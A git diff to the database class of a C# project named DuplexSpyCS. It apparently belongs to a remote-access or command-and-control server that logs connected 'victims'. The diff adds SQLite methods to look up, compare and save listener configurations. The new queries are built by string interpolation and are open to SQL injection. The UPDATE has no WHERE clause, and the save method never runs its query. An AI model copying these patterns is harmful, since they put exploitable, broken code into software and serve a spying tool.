@@ -6,10 +6,11 @@ using System.Threading.Tasks;
 using System.Data.SQLite;
 using System.Data;
 using System.Data.Entity.Migrations.Model;
+using System.Xml.Linq;
 
 namespace DuplexSpyCS
 {
-    internal class SqlConn
+    public class SqlConn
     {
         //LOG EVENT
         public delegate void NewVictimEventHandler(Victim v, string os, string host);
@@ -501,23 +502,80 @@ namespace DuplexSpyCS
             }
         }
 
-        public DataTable fndtGetAllListener()
+        public stListenerConfig fnGetListener(string szName)
         {
-            DataTable dt = new DataTable();
+            if (fnbListenerExists(szName))
+            {
+                string szQuery = $"SELECT * FROM \"Listener\" WHERE \"Name\" = \"{szName}\";";
+                DataTable dt = GetDataTable(szQuery);
+                DataRow dr = dt.Rows[0];
+                return new stListenerConfig()
+                {
+                    szName = dr["Name"].ToString(),
+                    enProtocol = (enListenerProtocol)Enum.Parse(typeof(enListenerProtocol), dr["Protocol"].ToString()),
+                    nPort = int.Parse(dr["Port"].ToString()),
+                    szDescription = dr["Description"].ToString(),
+                    dtCreationDate = DateTime.Parse(dr["CreationDate"].ToString()),
+                };
+            }
+            else
+            {
+                MessageBox.Show("Listener not exists: " + szName, "fnGetListener()", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                return new stListenerConfig();
+            }
+        }
+        public List<stListenerConfig> fndtGetAllListener()
+        {
+            List<stListenerConfig> lListener = new List<stListenerConfig>();
+            string szQuery = $"SELECT * FROM \"Listener\";";
+            DataTable dt = GetDataTable(szQuery);
+            foreach (DataRow dr in dt.Rows)
+            {
+                stListenerConfig config = new stListenerConfig()
+                {
+                    szName = dr["Name"].ToString(),
+                    enProtocol = (enListenerProtocol)Enum.Parse(typeof(enListenerProtocol), dr["Protocol"].ToString()),
+                    nPort = int.Parse(dr["Port"].ToString()),
+                    szDescription = dr["Description"].ToString(),
+                    dtCreationDate = DateTime.Parse(dr["CreationDate"].ToString()),
+                };
 
-            return dt;
+                lListener.Add(config);
+            }
+
+            return lListener;
         }
 
-        public bool fnListenerExists(string szName)
+        public bool fnbListenerExists(string szName)
         {
             try
             {
+                string szQuery = $"SELECT EXISTS(SELECT 1 FROM \"Listener\" WHERE \"Name\" = \"{szName}\");";
+                DataTable dt = GetDataTable(szQuery);
 
-
-                return true;
+                return (string)dt.Rows[0][0] == "1";
             }
             catch (Exception ex)
             {
+                return false;
+            }
+        }
+        public bool fnbListenerEqual(stListenerConfig config, string szName)
+        {
+            try
+            {
+                stListenerConfig stCheckConfig = fnGetListener(szName);
+                return (
+                    config.szName == stCheckConfig.szName
+                    && config.enProtocol == stCheckConfig.enProtocol
+                    && config.nPort == stCheckConfig.nPort
+                    && config.szDescription == stCheckConfig.szDescription
+                    && config.dtCreationDate == stCheckConfig.dtCreationDate
+                );
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message, "fnbListenerEqual()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 return false;
             }
         }
@@ -526,13 +584,33 @@ namespace DuplexSpyCS
         {
             try
             {
+                string szQuery = string.Empty;
+                if (fnbListenerExists(config.szName))
+                {
+                    szQuery = $"UPDATE \"Listener\" SET " +
+                        $"\"Name\"=\"{config.szName}\"," +
+                        $"\"Protocol\"=\"{config.enProtocol}\"," +
+                        $"\"Port\"=\"{config.nPort}\"," +
+                        $"\"Description\"=\"{config.szDescription}\"," +
+                        $"\"CreationDate\"=\"{config.dtCreationDate.ToString("F")}\";";
+                }
+                else
+                {
+                    szQuery = $"INSERT INTO \"Listener\" VALUES " +
+                        $"(" +
+                        $"{config.szName}," +
+                        $"{config.enProtocol}," +
+                        $"{config.nPort}," +
+                        $"{config.szDescription}," +
+                        $"{config.dtCreationDate.ToString("F")}" +
+                        $");";
+                }
 
-
-                return true;
+                return fnbListenerEqual(config, config.szName);
             }
             catch (Exception ex)
             {
-                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
+                MessageBox.Show(ex.Message, "fnbSaveListener()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 return false;
             }
         }
